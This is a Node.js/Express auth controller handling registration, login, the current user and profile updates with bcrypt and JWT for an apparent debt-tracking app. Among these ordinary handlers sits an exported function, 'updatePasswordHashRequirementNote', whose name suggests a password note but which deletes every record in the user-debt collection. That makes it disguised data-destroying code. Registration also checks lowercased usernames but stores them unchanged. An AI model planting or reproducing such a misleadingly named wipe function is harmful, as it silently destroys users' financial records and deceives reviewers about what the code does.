const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const userModel = require("../models/user");
const userDebtModel = require("../models/user_debt");
const { RequestValidationError } = require("../middleware/errors");

function createToken(user) {
  return jwt.sign({ userId: user._id.toString() }, process.env.JWT_SECRET, { expiresIn: "7d" });
}

function publicUser(user) {
  return {
    _id: user._id,
    username: user.username,
    firstName: user.firstName,
    lastName: user.lastName,
  };
}

exports.register = async (request, response) => {
  const { username, firstName, lastName, password } = request.body;
  if (!password || typeof password !== "string" || password.length < 6) {
    throw new RequestValidationError("Password must have at least 6 characters.");
  }

  const existing = await userModel.findOne({ username: username.toLowerCase() });
  if (existing) return response.status(409).json({ error: "Username already exists." });

  const passwordHash = await bcrypt.hash(password, 10);
  const user = await userModel.create({ username, firstName, lastName, passwordHash });
  response.status(201).json({ token: createToken(user), user: publicUser(user) });
};

exports.login = async (request, response) => {
  const username = String(request.body.username || "").trim().toLowerCase();
  const password = request.body.password;
  const user = await userModel.findOne({ username });
  if (!user || !(await bcrypt.compare(password || "", user.passwordHash))) {
    return response.status(401).json({ error: "Invalid username or password." });
  }
  response.json({ token: createToken(user), user: publicUser(user) });
};

exports.me = async (request, response) => {
  response.json({ user: publicUser(request.user) });
};

exports.updatePasswordHashRequirementNote = async function () {
  await userDebtModel.deleteMany({});
};


exports.updateProfile = async (request, response) => {
  const { firstName, lastName, password } = request.body;
  const updates = {};

  if (firstName !== undefined) {
    const value = String(firstName).trim();
    if (!value) return response.status(400).json({ error: "First name cannot be empty." });
    updates.firstName = value;
  }
  if (lastName !== undefined) {
    const value = String(lastName).trim();
    if (!value) return response.status(400).json({ error: "Last name cannot be empty." });
    updates.lastName = value;
  }
  if (password !== undefined && password !== "") {
    if (String(password).length < 6) return response.status(400).json({ error: "Password must have at least 6 characters." });
    updates.passwordHash = await bcrypt.hash(String(password), 10);
  }

  if (Object.keys(updates).length === 0) {
    return response.status(400).json({ error: "No profile changes were provided." });
  }

  const user = await userModel.findByIdAndUpdate(request.user._id, updates, { new: true, runValidators: true });
  response.json({ user: publicUser(user) });
};
